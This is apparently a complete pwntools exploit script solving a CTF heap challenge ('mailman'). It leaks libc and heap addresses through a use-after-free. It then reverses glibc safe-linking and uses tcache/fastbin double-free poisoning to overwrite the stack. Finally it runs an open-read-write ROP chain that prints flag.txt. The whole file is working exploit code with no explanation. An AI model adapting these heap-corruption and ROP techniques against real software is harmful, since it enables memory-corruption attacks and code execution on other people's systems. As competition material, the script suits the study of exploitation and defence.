from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.update(
    terminal='kitty',
    log_level='debug'
)


def add(idx:int, size:int, msg:bytes): # write
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ',f'{idx}'.encode())
    p.sendlineafter(b'letter size: ',f'{size}'.encode())
    p.sendlineafter(b'content: ', msg)

def free(idx:int): # send
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ',f'{idx}'.encode())

def read(idx:int): # read
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ',f'{idx}'.encode())

def demangle(addr:int) -> int:
    mid = addr >> 12 ^ addr
    ril = mid >> 24 ^ mid
    return ril

def mangle(leak:int, target:int) -> int:
    return leak >> 12 ^ target

p = remote('mailman.chal.imaginaryctf.org', 1337)
# p = elf.process()


for i in range(7):
    add(i, 0x100, f'{i}'.encode()*0x10)

add(7, 0x100, b'UNSORTED BIN')

for i in range(7):
    free(i)

add(8, 0x20, b'NO CORRUPT')
free(7)
read(7)
libc.address = u64(p.recvline(0).ljust(8,b'\x00')) - libc.sym.main_arena - 96
info('%x', libc.address)

read(1)
heap = u64(p.recvline(0).ljust(8,b'\x00'))
heap = demangle(heap)
info('%x', heap)

for i in range(7):
    add(i, 0x40, f'{i}'.encode()*0x10)

add(7, 0x40, b'a')
add(8, 0x40, b'b')
add(9, 0x40, b'c')

for i in range(7):
    free(i)

free(7)
free(8)
free(7)

for i in range(7):
    add(i, 0x40, f'{i}'.encode()*0x10)

add(7, 0x40, p64(mangle(heap, libc.sym.environ)))
add(8, 0x40, b'./flag.txt\x00')
add(9, 0x40, b'awikwokwk')
add(10, 0x40, b'')

add(11, 0x40, b'STACK')
free(11)
read(11)

flag = heap + 2624

rip = mangle(libc.sym.environ, mangle(heap, u64(p.recvline(0).ljust(8, b'\x00')))) - 0x190
info('%x', rip)

rax = libc.address + 0x0000000000045eb0
rdi = libc.address + 0x000000000002a3e5
rsi = libc.address + 0x00000000001303b2
rdx_r12 = libc.address + 0x000000000011f497
ret = libc.address + 0x00000000000f90e1
syscall = libc.address + 0x0000000000091396

rop1 = flat(
    ret,
    rax,
    0x2,
    rdi,
    flag,
    rsi,
    0x0,
    syscall,
    rax,
    0x0,
    rdi,
    0x3,
    rsi,
    rip-0x60,
)
rop2 = flat(
    rdx_r12,
    0x60,
    0x00,
    syscall,
    rax,
    0x1,
    rdi,
    0x1,
    syscall
)



for i in range(7):
    add(i, 0x60, f'{i}'.encode()*0x10)

add(7, 0x60, b'a')
add(8, 0x60, b'b')
add(9, 0x60, b'c')

for i in range(7):
    free(i)

free(7)
free(8)
free(7)

read(6)
heap = u64(p.recvline(0).ljust(8,b'\x00'))
heap = demangle(heap)
info('%x', heap)

for i in range(7):
    add(i, 0x60, f'{i}'.encode()*0x10)

info('%x',rip-8)

add(7, 0x60, p64(mangle(heap, rip-8+len(rop1))))
add(8, 0x60, b'awikwokwk')
add(9, 0x60, b'awikwokwk')
add(10, 0x60, rop2)


for i in range(7):
    add(i, 0x71, f'{i}'.encode()*0x10)

add(7, 0x71, b'a')
add(8, 0x71, b'b')
add(9, 0x71, b'c')

for i in range(7):
    free(i)

free(7)
free(8)
free(7)

read(7)
heap = u64(p.recvline(0).ljust(8,b'\x00'))
heap = demangle(heap)
info('%x', heap)

for i in range(7):
    add(i, 0x71, f'{i}'.encode()*0x10)

add(7, 0x71, p64(mangle(heap, rip-8)))
add(8, 0x71, b'awikwokwk')
add(9, 0x71, b'awikwokwk')

c = f'''
b* {syscall}
c
'''

# gdb.attach(p,c)
# print(hex(rip))
sleep(1)
add(10, 0x71, rop1)


p.interactive()